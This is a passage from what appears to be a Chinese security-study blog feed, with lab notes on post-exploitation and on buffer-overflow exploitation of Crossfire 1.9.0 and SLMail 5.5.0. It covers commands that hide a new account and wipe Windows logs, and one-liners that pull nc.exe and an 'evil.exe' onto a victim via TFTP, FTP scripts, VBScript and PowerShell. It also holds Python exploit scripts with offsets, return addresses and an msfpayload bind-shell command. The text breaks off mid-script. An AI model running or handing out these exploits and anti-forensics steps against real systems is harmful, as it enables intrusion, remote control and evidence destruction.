e-mail and data files</li><li>业务数据库； 身份认证服务器数据库</li><li>/tmp</li></ul></li><li>Windows</li><li><ul><li>SAM数据库；注册表文件</li><li>%SYSTEMROOT%\repair\SAM</li><li>%SYSTEMROOT%\System32\config\RegBack\SAM</li><li>业务数据库；身份认证数据库</li><li>临时文件目录</li><li>UserProfile\AppData\Local\Microsoft\Windows\Temporary Internet Files\</li></ul></li></ul><h4 id="隐藏痕迹"><a href="#隐藏痕迹" class="headerlink" title="隐藏痕迹"></a>隐藏痕迹</h4><ul><li>禁止在登陆界面显示新建账号</li><li>REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows<br>NT\CurrentVersion\WinLogon\SpecialAccounts\UserList” /v uname /T<br>REG_DWORD /D 0</li><li>del %WINDIR%*.log /a/s/q/f</li><li>History</li><li>日志</li><li><ul><li>auth.log / secure</li><li>btmp / wtmp</li><li>lastlog /faillog</li></ul></li><li>其他日志和HIDS等</li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>漏洞后利用阶段</title>
      <link href="/2018/03/19/%E6%BC%8F%E6%B4%9E%E5%90%8E%E5%88%A9%E7%94%A8%E9%98%B6%E6%AE%B5/"/>
      <url>/2018/03/19/%E6%BC%8F%E6%B4%9E%E5%90%8E%E5%88%A9%E7%94%A8%E9%98%B6%E6%AE%B5/</url>
      
        <content type="html"><![CDATA[<h2 id="后漏洞利用阶段"><a href="#后漏洞利用阶段" class="headerlink" title="后漏洞利用阶段"></a>后漏洞利用阶段</h2><h4 id="漏洞利用后阶段"><a href="#漏洞利用后阶段" class="headerlink" title="漏洞利用后阶段"></a>漏洞利用后阶段</h4><ul><li><p>上传工具</p></li><li><p>提权</p></li><li><p>擦除攻击痕迹</p></li><li><p>安装后门</p></li><li><ul><li>长期控制</li><li>Dump密码</li><li>内网渗透</li></ul></li><li><p>后漏洞利用阶段</p></li><li><ul><li>最大的挑战——防病毒软件</li><li>使用合法的远程控制软件</li></ul></li><li><p>上传文件</p></li><li><ul><li>持久控制</li><li>扩大对目标系统的控制能力</li></ul></li><li><p>Linux系统</p></li><li><ul><li>netcat</li><li>curl</li><li>wget</li></ul></li><li><p>Windows</p></li><li><ul><li>缺少预装的下载工具</li></ul></li><li><p>非交互模式shell</p></li><li><ul><li>类NC远程控制shell</li><li>ftp 192.168.1.1</li></ul></li><li><p>传输文件</p></li><li><ul><li>Tftp</li><li>Ftp</li><li>Vbscript</li><li>Debug</li></ul></li><li><p>使用TFTP传输文件</p></li><li><ul><li>XP 2003 默认安装</li><li>Win7 2008 需要单独添加</li><li>经常被边界防火墙过滤</li><li>kali</li><li><ul><li>mkdir /tftp</li><li>atftpd –daemon –port 69 /tftp</li><li>cp /usr/share/windows-binaries/nc.exe /tftp/</li><li>chown -R nobody /tftp</li></ul></li><li>windows</li><li>tftp -i 192.168.10.5 get nc.exe</li></ul></li><li><p>使用FTP传输文件</p></li><li><ul><li><p>kali</p></li><li><p>apt-get install pure-ftpd</p></li><li><p>Windows</p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo open 192.168.10.5 21 &gt; ftp.txt</span><br><span class="line">echo yuanfh &gt;&gt; ftp.txt</span><br><span class="line">echo password &gt;&gt; ftp.txt</span><br><span class="line">echo bin &gt;&gt; ftp.txt</span><br><span class="line">echo GET nc.exe &gt;&gt; ftp.txt</span><br><span class="line">echo bye &gt;&gt; ftp.txt</span><br><span class="line">ftp -s:ftp.txt</span><br></pre></td></tr></table></figure></li></ul></li><li><p>使用VBSCRIPT 传输文件</p></li><li><ul><li>service apache2 start</li><li>cd /var/www/html cp/ftphome/whoami.exe</li></ul></li><li><ul><li>wget.vbs</li><li>cscript wget.vbs <a href="http://192.168.1.117/nc.exe" target="_blank" rel="noopener">http://192.168.1.117/nc.exe</a> nc.exe</li></ul></li><li><p>使用POWERSHELL传输文件</p></li><li><ul><li><p>Wget.ps</p></li><li><p>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1</p></li><li><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$storageDir</span> = <span class="variable">$pwd</span></span><br><span class="line"><span class="variable">$webclient</span> = <span class="built_in">New-Object</span> System.Net.WebClient</span><br><span class="line"><span class="variable">$url</span> = <span class="string">"http://192.168.10.5/evil.exe"</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">"new-exploit.exe"</span></span><br><span class="line"><span class="variable">$webclient</span>.DownloadFile(<span class="variable">$url</span>,<span class="variable">$file</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li><p>使用DEBUG传输文件</p></li><li><p>Debug</p></li><li><ul><li>汇编、反汇编</li><li>16进制dump工具</li><li>64K字节</li></ul></li><li><p>upx压缩文件</p></li><li><p>wine exe2bat.exe nc.exe nc.txt</p></li><li><p>debug&lt;nc.hex</p></li><li><p>copy 1.dll nc.exe</p></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Linux缓冲区溢出</title>
      <link href="/2018/03/18/Linux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
      <url>/2018/03/18/Linux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux缓冲区溢出"><a href="#Linux缓冲区溢出" class="headerlink" title="Linux缓冲区溢出"></a>Linux缓冲区溢出</h2><ul><li><p>Crossfire</p></li><li><ul><li>多人在线RPG游戏</li><li>1.9.0版本接受入站socket连接时存在缓冲区溢出漏洞</li></ul></li><li><p>调试工具</p></li><li><ul><li>edb</li></ul></li><li><p>运行平台</p></li><li><ul><li>kali i486虚拟机</li></ul></li><li><p>新版本Linux内核支持内存保护机制</p></li><li><ul><li>DEP</li><li>ASLR</li><li>堆栈cookies</li><li>堆栈粉碎</li></ul></li><li><p>本机调试</p></li><li><ul><li><code>iptables -A INPUT -p tcp --destination-port 4444 \!-d 127.0.0.1 -j DROP</code></li><li><code>iptables -A INPUT -p tcp --destination-port 13327 \! -d 127.0.0.1 -j DROP</code></li></ul></li><li><p>调试</p></li><li><ul><li><code>edb --run /usr/games/crossfire/bin/crossfire</code></li></ul></li><li><p>01.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​</p></li><li><p>唯一字符串识别EIP精确位置</p></li><li><ul><li><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4379</code></li><li><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 46367046</code></li><li>4368</li><li>02.py</li><li>03.py</li></ul></li><li><p>思路：</p></li><li><p>第一阶段shellcode</p></li><li><ul><li>ESP跳转到EAX</li><li>偏移12个字节</li></ul></li><li><p>setup sound shellcode2</p></li><li><p><code>/usr/share/metasploit-framework/tools/exploit nasm_shell.rb</code></p></li><li><ul><li>add eax,12</li><li>jmp eax</li><li>\x83\xc0\x0c\xff\xe0\x90\x90</li></ul></li><li><p>查找坏字符</p></li><li><ul><li>\x00\x0a\x0d\x20</li></ul></li><li><p>ESP 跳转地址</p></li><li><ul><li>Opcode search</li><li>crash = “\x41” * 4368 + “\x97\x45\x13\x08” + “\x83\xc0\x0c\xff\xe0\x90\x90”</li></ul></li><li><p>设断点（0x08134597)</p></li><li><ul><li>EIP  08134597</li><li>jsp esp</li><li>add eax, 12</li><li>jmp eax</li><li>​</li></ul></li><li><p><code>msfpayload linux/x86/shell_bind_tcp LPORT=4444 R | msfencode -b &quot;\x00\x0a\x0d\x20&quot;</code></p></li><li><p>​</p></li></ul><p>05.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">host = <span class="string">"127.0.0.1"</span></span><br><span class="line">shellcode = ()</span><br><span class="line">crash = shellcode + <span class="string">'A'</span>*(<span class="number">4368</span><span class="number">-78</span>) + <span class="string">'\x97\x45\x13\x08'</span> +<span class="string">'\x83\xc0\x0c\xff\xe0\x90\x90'</span></span><br><span class="line"></span><br><span class="line">buffer = <span class="string">"\x11(setup sound "</span> + crash + <span class="string">"\x90\x00#"</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]Sending evil buffer..."</span></span><br><span class="line">s.connect((host, <span class="number">13327</span>))</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]Payload Sent!"</span></span><br></pre></td></tr></table></figure><p>选择和修改EXP</p><ul><li>网上公开的EXP代码</li><li><ul><li>选择可信赖的EXP源</li><li>Exploit-db</li><li>SecurityFocus</li><li>Searchsploit</li><li>有能力修改EXP（Python Perl Ruby C C++)</li></ul></li><li><code>searchsploit slmail</code></li><li>646.c</li><li><ul><li>类unix环境下编译</li><li>返回地址与我们的环境不符</li><li>反弹shell硬编码了回连IP地址</li><li>缓冲区偏移量与我们的环境不符</li><li>目标IP硬编码</li></ul></li><li>646.c</li><li><ul><li>windows环境下编译</li><li>apt-get install mingw32</li><li>dpkg –add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install<br>wine32<br>• i586-mingw32msvc-gcc 646.c -lws2_32 -o sl.exe<br>• wine sl.exe 192.168.20.32</li></ul></li><li>不同的EXP</li><li><ul><li>不同的系统补丁</li><li>软件版本</li><li>不同的offset shellcode</li></ul></li><li>扫描探测目标系统版本，搭建适当的测试环境</li><li><ul><li>避免一锤子测试</li></ul></li><li>修改公开的EXP满足不同环境需要</li><li><ul><li>了解漏洞原理，修改溢出代码</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Win缓冲区溢出</title>
      <link href="/2018/03/17/Win%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
      <url>/2018/03/17/Win%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h4 id="程序漏洞来源"><a href="#程序漏洞来源" class="headerlink" title="程序漏洞来源"></a>程序漏洞来源</h4><ul><li>罪恶的根源：变量</li><li>数据与代码边界不清</li><li>最简漏洞原理—— shell脚本漏洞</li></ul><h4 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h4><ul><li>当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被撑爆，从而覆盖了相邻内存区域的数据</li><li>成功修改内存数据 ，可造成进程劫持，执行恶意代码，获取服务器控制权等后果</li></ul><h4 id="如何发现漏洞"><a href="#如何发现漏洞" class="headerlink" title="如何发现漏洞"></a>如何发现漏洞</h4><ul><li>源码审计</li><li>逆向工程</li><li>模糊测试<ul><li>向程序堆栈半随机的数据，根据内存变化判断溢出</li><li>数据生成器：生成随机、半随机数据</li><li>测试工具：识别溢出漏洞</li></ul></li></ul><h4 id="FUZZER"><a href="#FUZZER" class="headerlink" title="FUZZER"></a>FUZZER</h4><ul><li>SLMail 5.5.0 Mail Server<ul><li>POP3 PASS 命令存在缓冲区溢出漏洞</li><li>无需身份验证实现远程代码执行</li><li>DEP：阻止代码从数据页被执行</li><li>ASLR：随机内存地址加载执行程序和DLL，每次重启地址变化</li></ul></li></ul><p>01.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.10.128'</span>,<span class="number">110</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line">    s.send(<span class="string">'USER admin'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">    data=s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line">    s.send(<span class="string">'PASS test\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><ul><li>测试PASS命令接收到大量数据时是否会溢出</li><li>EIP寄存器存放下一条指令的地址</li></ul><p>02.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">buffer=[<span class="string">"A"</span>]</span><br><span class="line">counter=<span class="number">100</span></span><br><span class="line"><span class="keyword">while</span> len(buffer) &lt;= <span class="number">30</span>:</span><br><span class="line">    buffer.append(<span class="string">"A"</span>*counter)</span><br><span class="line">    counter=counter+<span class="number">200</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> buffer:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Fuzzing PASS with %s bytes"</span> % len(string)</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    connect = s.connect((<span class="string">'192.168.10.128'</span>,<span class="number">110</span>))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + string + <span class="string">'\r\n'</span>)</span><br><span class="line">    s.send(<span class="string">'QUIT\r\n'</span>)</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure><ul><li><p>2700个字符实现EIP寄存器溢出</p></li><li><p>03.py</p></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">'A'</span>*<span class="number">2700</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.10.128'</span>,<span class="number">110</span>))</span><br><span class="line">    date = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">    data=s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!."</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure></li><li><p>找到精确溢出的4个字节</p></li><li><ul><li><p>二分法</p></li><li><p>唯一字符串法</p></li><li><p>usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700</p></li><li><p>04.py</p></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">buffer=</span><br><span class="line"><span class="string">'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.10.128'</span>,<span class="number">110</span>))</span><br><span class="line">    date = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!."</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure></li><li><p>./pattern_offect.rb -q 39694438</p></li><li><p>05.py</p></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span> + <span class="string">"B"</span>*<span class="number">4</span>+<span class="string">"C"</span>*<span class="number">20</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.10.128'</span>,<span class="number">110</span>))</span><br><span class="line">    date = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!."</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure></li><li><p>思路：</p></li><li><ul><li><p>将EIP修改为shellcode代码的内存地址，将Shellcode写入到该地址空间，程序读取EIP寄存器数值，将跳转到shellcode代码段并执行</p></li><li><p>寻找可寻访shell code的内存空间</p></li><li><p>06.py</p></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">"A"</span>*<span class="number">2606</span> + <span class="string">"B"</span>*<span class="number">4</span> + <span class="string">"C"</span>*(<span class="number">3500</span><span class="number">-2605</span><span class="number">-4</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.10.128'</span>,<span class="number">110</span>))</span><br><span class="line">    date = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!."</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure></li><li><p>不同类型的程序、协议、漏洞，会将某些字符认为是坏字符，这些字符有固定用途</p></li><li><ul><li><p>返回地址、Shellcode、buffer中都不能出现坏字符</p></li><li><p>null byte (0x00)空字符，用于终止字符串的拷贝操作</p></li><li><p>return (0x0D) 回车操作，表示POP3 PASS命令输入完成</p></li><li><p>思路：发送0x00-0xff256个字符，查找所有坏字符</p></li><li><p>07.py</p></li><li><figure class="highlight python"><table><tr><td 